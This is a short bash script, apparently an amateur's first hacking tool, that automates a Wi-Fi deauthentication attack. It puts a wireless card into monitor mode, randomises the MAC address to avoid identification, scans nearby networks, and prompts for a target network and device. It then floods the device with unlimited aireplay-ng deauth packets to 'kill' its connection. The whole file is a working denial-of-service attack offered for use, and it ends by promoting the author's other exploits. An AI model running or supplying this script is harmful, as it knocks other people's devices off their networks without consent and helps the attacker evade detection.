#!/bin/bash
#THIS IS MY FIRST TOOL @WIFI_DEAUTHER
#THIS WILL KILL THE SPECIFIC TARGET IN DESIRED NETWORK


echo -e $greenme 
echo " RUN THIS TOOL IN ROOT  "
sleep 3
#colour declaration 
#
redme="\e[1;31m"
greenme="\e[0;32m"
yellowme="\e[1;33m"
green2="\e[1;32m"
white="\e[1;37m"
#
#
#
#
trap overload EXIT 
#
#
function overload()

{
     clear 
         sleep 1
             airmon-ng stop wlan0mon 
                macchanger -p wlan0
                  clear
                     
                    echo -e $redme
                 echo  "thanks for using my script support me and follow me @bash_.kid "
             echo -e $yellowme
          echo  "follow my github for further tools and exploits : https://github.com/Ba5hb0y "
       echo -e $greenme
echo  " AIM FOR IMPOSSIBLE "
exit
 
}
  
              





echo -e $green2
airmon-ng start wlan0 
echo -e $white 
echo " wlan0 in monitor mode "
ifconfig wlan0mon down
echo " changing mac "
echo -e $green2
macchanger -r wlan0mon
echo -e $white
echo " mac changed now ur safe "
echo -e $green2
ifconfig wlan0mon up
fileName=$(date  --rfc-3339=seconds).csv
echo -e $green2
airodump-ng --update 2 wlan0mon |& tee $fileName
echo -e $redme
echo ' select the target network .. '
echo -e $white
read nameAP
echo -e $redme 
echo  ' select the device u want to kill'
echo -e $white
read Device
macTarget=$(grep $nameAP $fileName | tr -s [:space:] | cut -d ' ' -f2 | uniq)
channelTarget=$(grep $nameAP $fileName | tr -s [:space:] | cut -d ' ' -f7 | uniq)
airmon-ng start wlan0mon $channelTarget
echo -e $redme
aireplay-ng -0 0  -a $macTarget -c $Device wlan0mon 
 
